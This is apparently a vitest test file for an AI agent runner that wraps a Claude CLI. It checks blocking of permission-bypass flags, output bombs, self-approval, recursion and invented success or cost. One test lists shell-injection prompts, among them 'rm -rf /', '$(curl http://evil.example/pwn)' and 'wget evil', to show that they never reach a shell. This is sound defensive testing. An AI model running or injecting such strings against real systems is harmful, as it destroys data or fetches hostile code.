import { describe, expect, it } from "vitest";
import { randomBytes } from "node:crypto";
import type { JobEnvelope } from "@worksocial/contracts";
import {
  AGENT_ROLE_IDS,
  RoleExecutionMode,
  RoleRunStatus,
  createBudgetAccount,
  validateRoleStructuredOutput,
} from "@worksocial/domain";
import {
  validateCliArgs,
  FORBIDDEN_CLI_FLAGS,
  isRegisteredAgentName,
  DEFAULT_LIVE_CLI_TOOLS,
  assessStdoutBound,
  assertOutputBombBoundedHonest,
  assertOutputBombReclaimIdempotent,
  quarantineStdoutDelivery,
  reclaimOutputBombDecision,
  planClaudeCliInvocation,
  invokeClaudeCli,
  type OutputBombReclaimResult,
} from "./cli-adapter.js";
import { createClaudeRunner } from "./runner.js";
import { runAllRoleFixtureEvaluations } from "./fixture-runner.js";
import { BoundedQueue } from "./queue.js";

function uuid(): string {
  const bytes = randomBytes(16);
  bytes[6] = (bytes[6] & 0x0f) | 0x40;
  bytes[8] = (bytes[8] & 0x3f) | 0x80;
  const hex = bytes.toString("hex");
  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-${hex.slice(12, 16)}-${hex.slice(16, 20)}-${hex.slice(20)}`;
}

function envelopeFor(roleId: string, overrides?: Partial<JobEnvelope>): JobEnvelope {
  return {
    jobId: uuid(),
    roleId,
    workflowId: `wf-${roleId}`,
    siteId: "worksocial",
    assetId: "asset-1",
    trigger: "unit_test",
    policyVersion: "r1-04",
    inputArtifactIds: ["in-1"],
    capabilityGrantId: "grant-fixture",
    sourceRevision: "rev-1",
    maxAttempts: 1,
    deadlineSeconds: 60,
    idempotencyKey: `unit/${roleId}/${uuid()}`,
    expectedOutcome: "fixture-ok",
    ...overrides,
  };
}

describe("claude-runner (R1-04)", () => {
  it("refuses permission-bypass flags", () => {
    for (const flag of FORBIDDEN_CLI_FLAGS) {
      expect(validateCliArgs([flag]).ok).toBe(false);
    }
    expect(validateCliArgs(["--print", "--output-format", "json"]).ok).toBe(true);
  });

  it("accepts only registered agent names, not paths", () => {
    expect(isRegisteredAgentName("A01")).toBe(true);
    expect(isRegisteredAgentName("/tmp/.claude/agents/A01.md")).toBe(false);
    expect(DEFAULT_LIVE_CLI_TOOLS).toBe("");
  });

  it("bounds and quarantines output-bomb stdout (T-X011)", () => {
    const over = assessStdoutBound("A".repeat(100), 50);
    expect(over.withinBound).toBe(false);
    if (!over.withinBound) {
      expect(over.code).toBe("OUTPUT_TOO_LARGE");
    }
    expect(over.liveProviderSuccessClaimed).toBe(false);
    expect(over.externalEffects).toBe("NONE");
    const overQ = quarantineStdoutDelivery(over);
    expect(overQ.deliver).toBe(false);
    if (!overQ.deliver) {
      expect(overQ.quarantinedStdout).toBeNull();
    }
    expect(
      assertOutputBombBoundedHonest({ assessment: over, quarantine: overQ }).ok,
    ).toBe(true);

    const under = assessStdoutBound("ok", 50);
    expect(under.withinBound).toBe(true);
    expect(quarantineStdoutDelivery(under).deliver).toBe(true);

    const atBound = assessStdoutBound("A".repeat(50), 50);
    expect(atBound.withinBound).toBe(true);

    const zeroMax = assessStdoutBound("x", 0);
    expect(zeroMax.withinBound).toBe(false);
    expect(assessStdoutBound("x", -1).withinBound).toBe(false);
    expect(assessStdoutBound("x", Number.POSITIVE_INFINITY).withinBound).toBe(
      false,
    );
    expect(assessStdoutBound("x", Number.NaN).withinBound).toBe(false);

    const liveClaim = quarantineStdoutDelivery(under, {
      claimLiveVerified: true,
    });
    expect(liveClaim.deliver).toBe(false);
    if (!liveClaim.deliver) {
      expect(liveClaim.code).toBe("LIVE_CLAIM_REFUSED");
    }

    const force = quarantineStdoutDelivery(over, {
      forceDeliverDespiteBomb: true,
    });
    expect(force.deliver).toBe(false);
    if (!force.deliver) {
      expect(force.code).toBe("LIVE_CLAIM_REFUSED");
    }

    // Mismatched pair: under-bound assessment + OUTPUT_TOO_LARGE quarantine.
    const mismatched = assertOutputBombBoundedHonest({
      assessment: under,
      quarantine: overQ,
    });
    expect(mismatched.ok).toBe(false);
    expect(mismatched.code).toBe("OUTPUT_BOMB_DISHONEST");

    expect(
      assertOutputBombBoundedHonest({
        assessment: under,
        quarantine: liveClaim,
      }).ok,
    ).toBe(true);

    const emoji = assessStdoutBound("🔥".repeat(20), 40);
    expect(emoji.withinBound).toBe(false);

    // Idempotent reclaim (I7): double reclaim of bomb agrees; no invent deliver.
    const bomb = "B".repeat(100);
    const r1 = reclaimOutputBombDecision(bomb, 50);
    const r2 = reclaimOutputBombDecision(bomb, 50);
    const idem = assertOutputBombReclaimIdempotent({ first: r1, second: r2 });
    expect(idem.ok).toBe(true);
    expect(idem.code).toBe("OUTPUT_BOMB_RECLAIM_IDEMPOTENT");
    expect(r1.quarantine.deliver).toBe(false);
    expect(r1.priorDeliverInvented).toBe(false);

    const forced = reclaimOutputBombDecision(bomb, 50, {
      forceDeliverDespiteBomb: true,
    });
    expect(forced.quarantine.deliver).toBe(false);
    if (!forced.quarantine.deliver) {
      expect(forced.quarantine.code).toBe("LIVE_CLAIM_REFUSED");
    }
    const afterForce = reclaimOutputBombDecision(bomb, 50);
    expect(afterForce.quarantine.deliver).toBe(false);
    if (!afterForce.quarantine.deliver) {
      expect(afterForce.quarantine.code).toBe("OUTPUT_TOO_LARGE");
    }

    const dualClaim = quarantineStdoutDelivery(over, {
      claimLiveVerified: true,
      forceDeliverDespiteBomb: true,
    });
    expect(dualClaim.deliver).toBe(false);
    if (!dualClaim.deliver) {
      expect(dualClaim.code).toBe("LIVE_CLAIM_REFUSED");
    }
    expect(
      assertOutputBombBoundedHonest({
        assessment: over,
        quarantine: dualClaim,
      }).ok,
    ).toBe(true);

    const tamperedSecond: OutputBombReclaimResult = { ...r2 };
    if (
      !r1.assessment.withinBound &&
      !tamperedSecond.assessment.withinBound
    ) {
      (tamperedSecond.assessment as { code: string }).code = "INVENTED_CODE";
      const codeDrift = assertOutputBombReclaimIdempotent({
        first: r1,
        second: tamperedSecond,
      });
      expect(codeDrift.ok).toBe(false);
      expect(codeDrift.code).toBe("OUTPUT_BOMB_RECLAIM_DRIFT");
    }
  });

  it("refuses invokeClaudeCli when maxOutputBytes is nonpositive or non-finite (T-X011)", async () => {
    const { mkdtempSync, writeFileSync, chmodSync, rmSync } = await import(
      "node:fs"
    );
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const dir = mkdtempSync(join(tmpdir(), "ws-bound-"));
    try {
      const script = join(dir, "quiet.mjs");
      writeFileSync(
        script,
        "#!/usr/bin/env node\nprocess.exit(0);\n",
        "utf8",
      );
      chmodSync(script, 0o755);
      for (const maxOutputBytes of [0, -1, Number.POSITIVE_INFINITY, Number.NaN]) {
        const result = await invokeClaudeCli({
          executablePath: script,
          agentName: "A01",
          cwd: dir,
          modelId: "fixture-model",
          prompt: "quiet",
          timeoutMs: 2_000,
          maxOutputBytes,
        });
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.code).toBe("OUTPUT_TOO_LARGE");
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("plans CLI with prompt on stdin only — no shell interpolation (T-X010)", () => {
    const malicious = [
      '"; rm -rf / #',
      "$(curl http://evil.example/pwn)",
      "`id`",
      "ok | sh",
      "page title && wget evil",
    ];
    for (const prompt of malicious) {
      const plan = planClaudeCliInvocation({
        agentName: "A13",
        modelId: "claude-fixture",
        prompt,
      });
      expect(plan.ok).toBe(true);
      if (!plan.ok) continue;
      expect(plan.shell).toBe(false);
      expect(plan.promptDelivery).toBe("stdin");
      expect(plan.prompt).toBe(prompt);
      expect(plan.argv.join("\0")).not.toContain(prompt);
      for (const token of [";", "$(", "`", "|", "&&"]) {
        if (prompt.includes(token)) {
          expect(plan.argv.some((a) => a.includes(token))).toBe(false);
        }
      }
    }
    expect(
      planClaudeCliInvocation({
        agentName: "A01",
        modelId: "claude-fixture",
        prompt: "benign",
        tools: "Bash",
      }).ok,
    ).toBe(false);
    expect(
      planClaudeCliInvocation({
        agentName: "A01",
        modelId: "claude-fixture",
        prompt: "benign",
        extraArgs: ["--dangerously-skip-permissions"],
      }).ok,
    ).toBe(false);
  });

  it("runs all 30 roles in fixture mode", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const results = await runner.evaluateAllRolesFixture();
    expect(results).toHaveLength(30);
    expect(results.map((r) => r.roleId).sort()).toEqual([...AGENT_ROLE_IDS].sort());
    for (const r of results) {
      expect(r.executionMode).toBe(RoleExecutionMode.FIXTURE);
      expect(r.permissionBypassUsed).toBe(false);
      expect(r.temporalEnqueue.status).toBe("NOT_WIRED");
      expect(r.startedAtIso.length).toBeGreaterThan(0);
      expect(r.finishedAtIso.length).toBeGreaterThan(0);
      expect(r.outcome.label === "SUCCESS" || r.outcome.label === "FAILURE").toBe(
        true,
      );
    }
  });

  it("evaluateAllRolesFixture forces fixture even when runner is live-capable", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: false,
    });
    const results = await runner.evaluateAllRolesFixture();
    expect(results.every((r) => r.executionMode === RoleExecutionMode.FIXTURE)).toBe(
      true,
    );
  });

  it("denies unauthorized effect attempts in fixture path", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const result = await runner.enqueue({
      envelope: envelopeFor("A13"),
      attemptUnauthorizedEffect: true,
    });
    expect(result.deniedEffects.length).toBeGreaterThan(0);
    expect(result.permissionBypassUsed).toBe(false);
  });

  it("denies self-approval attempts", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const result = await runner.enqueue({
      envelope: envelopeFor("A15"),
      attemptSelfApproval: true,
    });
    expect(result.deniedEffects.some((d) => d.code.includes("SELF"))).toBe(true);
    expect(result.status).toBe(RoleRunStatus.DENIED);
  });

  it("blocks uncontrolled recursion attempts", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const result = await runner.enqueue({
      envelope: envelopeFor("A01"),
      attemptUncontrolledRecursion: true,
    });
    expect(
      result.deniedDelegations.some((d) => d.code === "UNCONTROLLED_RECURSION"),
    ).toBe(true);
  });

  it("never enables permission bypass even when requested", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const result = await runner.enqueue({
      envelope: envelopeFor("A24"),
      requestPermissionBypass: true,
    });
    expect(result.permissionBypassUsed).toBe(false);
    expect(result.status).toBe(RoleRunStatus.DENIED);
  });

  it("reserves a concurrency lane for urgent P0/P1 work", async () => {
    const q = new BoundedQueue<number, number>({
      concurrency: 4,
      reservedUrgentSlots: 1,
      urgentMaxPriority: 1,
    });
    let maxNonUrgent = 0;
    let activeNonUrgent = 0;
    const slow = (n: number, priority: number) =>
      q.run({ id: String(n), priority, payload: n }, async (x) => {
        if (priority > 1) {
          activeNonUrgent += 1;
          maxNonUrgent = Math.max(maxNonUrgent, activeNonUrgent);
        }
        await new Promise((r) => setTimeout(r, 40));
        if (priority > 1) {
          activeNonUrgent -= 1;
        }
        return x;
      });

    const jobs = [
      slow(1, 4),
      slow(2, 4),
      slow(3, 4),
      slow(4, 4),
      slow(5, 0),
    ];
    await Promise.all(jobs);
    // Non-urgent cannot fill all 4 slots — reserved lane holds one.
    expect(maxNonUrgent).toBeLessThanOrEqual(3);
  });

  it("coalesces retries by idempotencyKey", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const key = `idem/${uuid()}`;
    const env = envelopeFor("A03", { idempotencyKey: key });
    const first = await runner.enqueue({ envelope: env });
    const second = await runner.enqueue({
      envelope: { ...env, jobId: uuid() },
    });
    expect(second.idempotentReplay).toBe(true);
    expect(second.runId).toBe(first.runId);
  });

  it("rolls daily budget when dayKey changes", async () => {
    const yesterday = createBudgetAccount({
      dayKey: "2020-01-01",
      currency: "USD",
      limitMinor: 50,
    });
    // Exhaust yesterday's account
    const { reserveBudget } = await import("@worksocial/domain");
    const exhausted = reserveBudget(yesterday, "old-res", 50);
    expect(exhausted.ok).toBe(true);

    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
      budgetAccount: exhausted.ok ? exhausted.account : yesterday,
    });
    // getBudgetAccount rotates to today with fresh limit.
    const account = runner.getBudgetAccount();
    expect(account.dayKey).not.toBe("2020-01-01");
    expect(account.reservedMinor).toBe(0);
    expect(account.settledMinor).toBe(0);
  });

  it("enforces aggregate fanout across task list", async () => {
    const { validateTypedDelegation, getAgentRoleContract } = await import(
      "@worksocial/domain"
    );
    const max = getAgentRoleContract("A01").resourceLimits.maxDelegationFanout;
    let accepted = 0;
    let denied = 0;
    for (let i = 0; i < max + 2; i += 1) {
      const d = validateTypedDelegation(
        {
          requestId: `t-${i}`,
          fromRoleId: "A01",
          toRoleId: "A12",
          objective: "x",
          inputArtifactIds: [],
          parentDepth: 0,
        },
        { currentFanout: accepted },
      );
      if (d.ok) {
        accepted += 1;
      } else {
        denied += 1;
        expect(d.code).toBe("FANOUT_EXCEEDED");
      }
    }
    expect(accepted).toBe(max);
    expect(denied).toBe(2);
  });

  it("binds envelope identities and rejects Claude envelope mismatch", () => {
    const jobId = "11111111-1111-4111-8111-111111111111";
    const payload = {
      type: "result",
      result: JSON.stringify({
        roleId: "A15",
        jobId,
        status: "ok",
        summary: "spoofed",
        proposedEffects: [],
        taskRequests: [],
      }),
    };
    const validated = validateRoleStructuredOutput(payload, {
      expectedRoleId: "A01",
      expectedJobId: jobId,
    });
    expect(validated.ok).toBe(false);
  });

  it("runAllRoleFixtureEvaluations covers thirty roles", () => {
    const all = runAllRoleFixtureEvaluations((roleId) => envelopeFor(roleId));
    expect(all).toHaveLength(30);
  });

  it("requireLive refuses silent fixture SUCCESS when CLI is absent (F01)", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: false,
    });
    const result = await runner.enqueue({
      envelope: envelopeFor("A01"),
      requireLive: true,
      forceFixture: false,
    });
    // Without a live CLI in CI, requireLive must fail closed — not fixture SUCCESS.
    expect(result.executionMode).toBe(RoleExecutionMode.LIVE_CLI);
    expect(result.status).toBe(RoleRunStatus.FAILED);
    expect(result.summary).toMatch(/refusing silent fixture/i);
    expect(result.outcome.label).toBe("FAILURE");
    expect(result.registeredAgentName).toBe("A01");
  });

  it("does not replay fixture SUCCESS under the same key when requireLive is set", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: false,
    });
    const key = `idem-live/${uuid()}`;
    const env = envelopeFor("A04", { idempotencyKey: key });
    const fixtureFirst = await runner.enqueue({
      envelope: env,
      forceFixture: true,
    });
    expect(fixtureFirst.executionMode).toBe(RoleExecutionMode.FIXTURE);
    expect(fixtureFirst.status).not.toBe(RoleRunStatus.FAILED);

    const liveSecond = await runner.enqueue({
      envelope: { ...env, jobId: uuid() },
      requireLive: true,
      forceFixture: false,
    });
    expect(liveSecond.idempotentReplay).not.toBe(true);
    expect(liveSecond.executionMode).toBe(RoleExecutionMode.LIVE_CLI);
    expect(liveSecond.status).toBe(RoleRunStatus.FAILED);
    expect(liveSecond.summary).toMatch(/refusing silent fixture/i);
  });

  it("records fixture cost as FIXTURE/0 — never invented 25/50/75 as ACTUAL (F07)", async () => {
    const runner = createClaudeRunner({
      workspaceRoot: process.cwd(),
      forceFixture: true,
    });
    const result = await runner.enqueue({
      envelope: envelopeFor("A02"),
      forceFixture: true,
    });
    expect(result.costKind).toBe("fixture");
    expect(result.costMinor).toBe(0);
    expect(result.outcome.costKind).toBe("fixture");
    expect([25, 50, 75]).not.toContain(result.costMinor);
  });
});
